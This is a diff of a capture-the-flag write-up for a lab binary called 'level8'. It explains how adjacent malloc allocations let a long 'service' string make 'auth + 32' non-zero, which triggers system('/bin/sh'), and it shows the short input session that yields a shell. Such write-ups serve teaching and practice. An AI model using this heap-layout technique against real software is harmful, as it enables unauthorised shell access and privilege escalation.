@@ -20,17 +20,26 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 
 ## Solution
 
+From the [disassembled code](./source.s) we can see, that `system("/bin/sh")` will be executed if `auth + 32` will be not equal to 0.
+
+But `auth` variable size is only 4 bytes:
+```c
+if (!ft_strncmp(buf, "auth ", 5)) {
+    auth = malloc(4);
+    ...
+```
+
+A knowledge that `malloc` result lay out in the memory consistently will be useful here. <br>
+First we'll allocate `auth` using direct `malloc` call and then allocate `service` using `strdup` that uses `malloc`. <br>
+That will produce two consistent memory block, and `auth + 32` will point to some byte in the `service` string.
+
 ```bash
 level8@RainFall:~$ ./level8 
 (nil), (nil) 
-auth Hack
+auth merrell
 0x804a008, (nil) 
-service Me if
+service so basically we just need to allocate a string that will be long enough
 0x804a008, 0x804a018 
-service You 
-0x804a008, 0x804a028 
-service Can
-0x804a008, 0x804a038 
 login
 $
 ```
